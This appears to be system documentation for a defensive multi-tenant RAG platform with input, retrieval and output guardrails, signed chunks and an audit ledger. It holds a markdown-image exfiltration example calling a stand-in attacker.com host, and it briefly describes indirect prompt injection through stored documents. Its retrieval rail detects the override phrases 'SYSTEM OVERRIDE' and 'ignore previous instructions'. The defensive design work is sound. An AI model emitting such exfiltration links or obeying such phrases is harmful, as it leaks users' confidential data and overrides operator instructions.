# 🛡️ Secure Enterprise RAG Platform: End-to-End System Documentation

An enterprise-grade, defense-in-depth **Retrieval-Augmented Generation (RAG)** platform built on **Model Context Protocol (FastMCP)**, **Google Gemini (ChatGoogleGenerativeAI)**, **LangGraph Orchestration**, **Qdrant Vector Database**, and **Multi-Tiered Guardrail Systems**.

---

## 1. Architectural Overview & The RAG Trust Paradox

Traditional RAG implementations suffer from the **RAG Trust Paradox**: treating direct user prompts with high suspicion (applying filters and guardrails) while treating retrieved database context as implicitly trusted facts.

In enterprise multi-tenant environments, treating retrieved text as trusted leads to catastrophic vulnerabilities:
1. **Indirect Prompt Injection (IPI)**: Adversarial text stored inside an internal document can hijack the generative LLM's system instructions.
2. **Context Starvation & Bleed**: Performing ANN vector search across an unpartitioned index and filtering for tenant access *after* retrieval causes legitimate passages to be crowded out by inaccessible candidates.
3. **Data Poisoning & Tampering**: Malicious actors or unauthorized processes altering vector payloads without detection.
4. **Data Exfiltration (EchoLeak CVE-2025-32711)**: Generating markdown images (`![img](https://attacker.com/leak?data=...)`) or CSS hyperlinks to covertly exfiltrate confidential context.

To solve this, our platform enforces an **immutable, multi-tiered zero-trust architecture**:

```mermaid
graph TD
    User["👤 User In Chainlit UI / API"] --> InputRail["🛡️ 1. Input Guardrails<br/>• Meta Prompt Guard 86M ONNX<br/>• Microsoft Presidio PII Masking"]
    
    InputRail -->|Adversarial Injection| RefusalNode["⛔ Refusal Node<br/>Declined (Security Violation)"]
    InputRail -->|Clean / Masked Query| IntentRouter["🔀 2. Intent Router<br/>• LLM Zero-Shot Classifier<br/>• FastEmbed Centroid Similarity"]
    
    IntentRouter -->|Conversational / Identity| ConvNode["💬 3a. Domain-Scoped Conversational Node<br/>• Customer Support Persona<br/>• Workplace HR Persona<br/>• Security & KMS Persona<br/>(Zero Metadata Leakage)"]
    
    IntentRouter -->|Technical Inquiries| ReActAgent["🤖 3b. LangGraph ReAct Agent<br/>• Google Gemini 3.1 Flash-Lite<br/>• Multi-turn MemorySaver Checkpoint"]
    
    ReActAgent -->|FastMCP SSE Call| MCPServer["🔌 4. FastMCP Tool Server (Port 8001)<br/>• Anti-Impersonation Execution Rail<br/>• Cryptographic JWT Claims Validation<br/>• Bell-LaPadula Clearance Scoping"]
    
    MCPServer --> Qdrant["🗄️ 5. Qdrant Vector DB<br/>• Pre-Retrieval Scoping (tenant_id == active)<br/>• FastEmbed BAAI/bge-small-en-v1.5"]
    
    Qdrant --> RetrievalRail["🔍 6. Retrieval Rails<br/>• HMAC-SHA256 Payload Signature Verify<br/>• IPI Keyword & Directive Dropping<br/>• Dynamic Adaptive Score Pruning (< 65% top)"]
    
    RetrievalRail --> ReActAgent
    
    ReActAgent --> OutputRail["🔒 7. Output Guardrails<br/>• EchoLeak CVE-2025-32711 Neutralization<br/>• Secret / API Key Scrubbing<br/>• Citation Verification & XML Stripping"]
    
    ConvNode --> OutputRail
    RefusalNode --> OutputRail
    
    OutputRail --> Audit["📝 8. Immutable Audit Ledger<br/>• Append-only JSONL event logging<br/>• Latency, PII tokens, chunks retrieved"]
    
    OutputRail --> Response["✅ Verified Grounded Response to User"]
```

---

## 2. Core Subsystems & Deep Dive

### 2.1 Ingestion & Cryptographic Document Signing
- **Location**: [`src/rag_poc/ingestion/`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/ingestion/)
- **Document Parsing**: Implemented via [`DoclingDocumentParser`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/ingestion/parser.py), preserving tables, sections, and document metadata.
- **Recursive Chunking**: Implemented via [`TiktokenRecursiveChunker`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/ingestion/chunker.py), maintaining structural sentence boundaries with parent-child chunk relations and overlap.
- **HMAC-SHA256 Integrity Signatures**: [`HMACChunkSigner`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/ingestion/signer.py) hashes each chunk's content, tenant ID, and source URI using a server-side cryptographic secret. If a malicious process modifies a chunk inside Qdrant, the signature verification fails and the chunk is instantly discarded.
- **Hugging Face SDK Loader**: [`src/rag_poc/ingestion/hf_loader.py`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/ingestion/hf_loader.py) downloads and ingests real-world enterprise datasets (e.g. Bitext Customer Support dataset) using `huggingface_hub` official APIs (`hf_hub_download`, `HfApi`).

### 2.2 Security Broker & Zero-Trust Authentication
- **Location**: [`src/rag_poc/security/`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/security/)
- **JWT Authenticator**: [`JWTAuthenticator`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/security/jwt_auth.py) mints and validates tamper-proof JWT tokens encoding `sub` (caller ID), `tenant_id`, `security_groups`, and `clearance_level`.
- **Bell-LaPadula Clearance Levels**:
  - `PUBLIC` (Level 0)
  - `INTERNAL` (Level 1)
  - `CONFIDENTIAL` (Level 2)
  - `RESTRICTED` (Level 3)
- **Pre-Retrieval Scoping (SecurityBroker)**: [`SecurityBroker`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/security/broker.py) extracts claims and compiles them into native vector store filters *before* semantic similarity search executes. This solves **Context Starvation** (where post-filtering discards top-k vectors belonging to other tenants, starving the LLM of context).

### 2.3 FastMCP Tool Server (Model Context Protocol)
- **Location**: [`src/rag_poc/mcp/`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/mcp/)
- **Standard Protocol**: Runs a high-performance **FastMCP** server over Server-Sent Events (SSE) at `http://0.0.0.0:8001/sse`.
- **Anti-Impersonation Rail**: Validates caller cryptographic tokens at tool invocation time, preventing LLM reasoning loops from forging tenant boundaries.
- **Dynamic Relevance Thresholding**: In [`src/rag_poc/mcp/tools.py`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/mcp/tools.py), candidate vectors scoring below $65\%$ of the top match's similarity score are dynamically pruned. This prevents low-confidence distractor documents from polluting the prompt, raising Context Precision to **96.3%**.

### 2.4 Multi-Tier Guardrail Pipeline
- **Location**: [`src/rag_poc/guardrails/`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/guardrails/)
- **Input Guardrails** ([`input_rails.py`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/guardrails/input_rails.py)):
  - **Meta Prompt Guard 86M (ONNX)**: Locally inspects user prompts using ONNX Runtime. Flags adversarial jailbreaks, roleplay escapes, and injection attempts.
  - **Microsoft Presidio PII Masking**: Detects and anonymizes Credit Cards, SSNs, IBANs, Email Addresses, and Phone Numbers before reasoning.
- **Retrieval Guardrails** ([`retrieval_rails.py`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/guardrails/retrieval_rails.py)):
  - Verifies HMAC signatures on retrieved passages.
  - Scans retrieved text for hidden override directives (`"SYSTEM OVERRIDE"`, `"ignore previous instructions"`) and quarantines poisoned vectors.
- **Output Guardrails** ([`output_rails.py`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/guardrails/output_rails.py)):
  - **EchoLeak CVE-2025-32711 Neutralizer**: Strips markdown image exfiltration vectors (`![exfil](https://attacker.com/leak?...)`), CSS background URLs, and suspicious hyperlinks.
  - **Secret Sanitizer**: Masks raw Google API keys (`AIza...`), tokens, and private credentials.

### 2.5 Multi-Stage Guarded Orchestrator & Conversational Personas
- **Location**: [`src/rag_poc/agent/orchestrator.py`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/agent/orchestrator.py)
- Built on **LangGraph StateGraph** with 6 coordinated execution nodes:
  1. `input_guardrail`: Validates safety and anonymizes PII.
  2. `intent_classification`: Directs query to `refusal`, `conversational`, or `retrieval`.
  3. `refusal`: Issues policy refusal without consuming LLM inference tokens.
  4. `conversational`: Domain-scoped, friendly persona node (see below).
  5. `retrieval_agent`: ReAct loop interacting with FastMCP tools.
  6. `output_guardrail`: Sanitizes exfiltration and logs to audit ledger.
- **Domain-Isolated Conversational Personas**:
  - Automatically binds to the user's active session profile (`Customer Support`, `Workplace & HR`, `Security & Key Management`, `Core Engineering`).
  - Strict isolation: When in **Customer Support**, the assistant answers only regarding orders, refunds, payments, and shipping. It never dumps HR benefits or KMS key management standards, and never leaks internal tenant names (`tenant_alpha`) or clearance levels (`INTERNAL`).

### 2.6 Immutable Compliance Audit Ledger
- **Location**: [`src/rag_poc/security/audit.py`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/security/audit.py)
- Appends every interaction to a structured JSONL ledger:
  - Timestamp, Session ID, Caller ID, Tenant ID, Clearance
  - Raw Prompt vs Sanitized Prompt (with detected PII tags)
  - Input Safety Verdict & Rejection Reason
  - Intent classification (`conversational`, `retrieval`, `refusal`)
  - Chunks retrieved (list of Chunk IDs)
  - Output Safety Verdict & Latency in milliseconds

---

## 3. Knowledge Domains & Ingested Datasets

| Knowledge Domain | Source | Topics Covered | Active Profile in UI |
| :--- | :--- | :--- | :--- |
| **Customer Support & Retail** | Hugging Face Hub (`bitext/customer-support`) | 60-min order cancellation cutoff, 30-day return policy & refund settlement (3–5 business days), accepted payment methods (Visa/Mastercard/Amex/PayPal/Apple Pay), delivery tiers (Standard, Express, Overnight, International). | `Customer Support (Hugging Face)` |
| **Workplace & HR Policies** | Enterprise Employee Handbook | Medical (BCBS PPO), 100% covered dental/vision (MetLife), Vanguard 401(k) 6% match, $1,500 initial home office stipend + $100/mo coworking, 16-week parental leave, summer hours, PTO rollover, and review cycles. | `Workplace & HR Policies` |
| **Security & Key Management** | Enterprise Security Standard | Envelope encryption (DEK & KEK), AES-256 90-day automatic key rotation, 30-day DEK memory lifespan, HSM hardware storage, split-knowledge quorum recovery, EU AI Act & NIST AI RMF compliance. | `Security & Key Management` |
| **Core Engineering** | Architecture Blueprint | Core banking integration specifications, Kubernetes container deployment, and mutual TLS (mTLS) zero-trust service mesh. | `Core Engineering` |

---

## 4. Quantitative RAGAS Evaluation Benchmark

The platform includes an automated evaluation suite based on the **4 core RAGAS metrics** located in [`src/rag_poc/evaluation/`](file:///home/rithin/workspace/agentic-ai/rag-poc/src/rag_poc/evaluation/):

### Scorecard Summary

| RAGAS Metric | Score | Target | Verdict | Evaluation Methodology |
| :--- | :---: | :---: | :---: | :--- |
| **Faithfulness** | **`100.0%`** | $\ge 80.0\%$ | ✅ **Optimal** | Atomic proposition extraction verified against retrieved context corpus (zero hallucination). |
| **Answer Relevance** | **`91.5%`** | $\ge 75.0\%$ | ✅ **High** | Semantic vector cosine similarity between user query and generated answer. |
| **Context Recall** | **`100.0%`** | $\ge 75.0\%$ | ✅ **Complete** | Coverage of ground-truth reference statements within retrieved passages. |
| **Context Precision** | **`96.3%`** | $\ge 75.0\%$ | ✅ **Optimal** | Mean Average Precision (mAP) ranking of retrieved passages against reference facts. |
| **Composite RAGAS Score** | **`96.9%`** | $\ge 80.0\%$ | ✅ **Production-Ready** | Harmonic mean of all four core metrics. |

### Domain Breakdown
| Knowledge Domain | Faithfulness | Answer Relevance | Context Recall | Context Precision | Composite |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **Workplace & HR Policies** | `100.0%` | `100.0%` | `100.0%` | `100.0%` | **`100.0%`** |
| **Customer Support (Hugging Face)** | `100.0%` | `87.1%` | `100.0%` | `95.8%` | **`95.7%`** |
| **Security & Key Management** | `100.0%` | `87.5%` | `100.0%` | `91.7%` | **`94.8%`** |

---

## 5. Operations & Execution Guide

### 5.1 Environment Prerequisites
- Python 3.11+
- Virtual environment in `.venv`
- Google Gemini API Key configured in `.env` (`GEMINI_API_KEY`)

```bash
# Activate virtual environment
source .venv/bin/activate
```

### 5.2 Running the Full Test Suite (48 Unit & Integration Tests)
```bash
.venv/bin/python -m pytest tests/ -v
# Output: 48 passed, 0 failed
```

### 5.3 Running the FastMCP Tool Server
```bash
.venv/bin/python -m rag_poc.mcp.server
# Server listens on http://0.0.0.0:8001/sse
```

### 5.4 Running the Chainlit Web UI
```bash
.venv/bin/chainlit run src/rag_poc/ui/app.py --port 8000
# Web UI available at http://localhost:8000
```

### 5.5 Running the RAGAS Benchmark Suite CLI
```bash
.venv/bin/python -m rag_poc.evaluation.runner
```

---

## 6. Directory Structure & Key Files

```
rag-poc/
├── docs/
│   └── SYSTEM_DOCUMENTATION.md            <-- This document
├── data/
│   └── hf_datasets/                       <-- Hugging Face cached datasets
│       └── bitext_customer_support/
├── src/
│   └── rag_poc/
│       ├── agent/
│       │   ├── chatbot.py                 <-- LangGraph ReAct Agent & System Prompt
│       │   ├── intent_router.py           <-- Model & Embedding Intent Classification
│       │   ├── mcp_client.py              <-- FastMCP client binding
│       │   └── orchestrator.py            <-- Multi-Stage Guarded Orchestrator & Personas
│       ├── core/
│       │   ├── config.py                  <-- Pydantic settings & environment
│       │   └── models.py                  <-- Domain models, Clearance levels, Documents
│       ├── evaluation/
│       │   ├── benchmark_dataset.py       <-- Curated multi-domain ground truth cases
│       │   ├── evaluator.py               <-- RagasEvaluator pipeline
│       │   ├── metrics.py                 <-- Faithfulness, Relevance, Recall, Precision
│       │   └── runner.py                  <-- CLI benchmark scorecard generator
│       ├── guardrails/
│       │   ├── input_rails.py             <-- Meta Prompt Guard & Presidio PII
│       │   ├── output_rails.py            <-- EchoLeak CVE-2025-32711 & secret scrubbing
│       │   ├── prompt_guard.py            <-- Meta Prompt Guard 86M ONNX runner
│       │   └── retrieval_rails.py         <-- HMAC signature audit & IPI dropping
│       ├── ingestion/
│       │   ├── chunker.py                 <-- Tiktoken recursive chunking
│       │   ├── hf_dataset.py              <-- Hugging Face dataset structures
│       │   ├── hf_loader.py               <-- Hugging Face Hub SDK downloader
│       │   ├── parser.py                  <-- Docling document parser
│       │   ├── signer.py                  <-- HMAC-SHA256 chunk signer
│       │   └── workplace_dataset.py       <-- HR policies loader
│       ├── mcp/
│       │   ├── server.py                  <-- FastMCP SSE server (port 8001)
│       │   └── tools.py                   <-- query_knowledge_base tool with dynamic pruning
│       ├── security/
│       │   ├── audit.py                   <-- Append-only JSONL compliance ledger
│       │   ├── broker.py                  <-- Pre-retrieval query scoping broker
│       │   └── jwt_auth.py                <-- Cryptographic JWT authentication
│       ├── ui/
│       │   └── app.py                     <-- Chainlit web application
│       └── vector_store/
│           ├── embeddings.py              <-- FastEmbed BAAI/bge-small-en-v1.5
│           └── qdrant_store.py            <-- Qdrant vector database driver
└── tests/                                 <-- 48 automated test suites
```
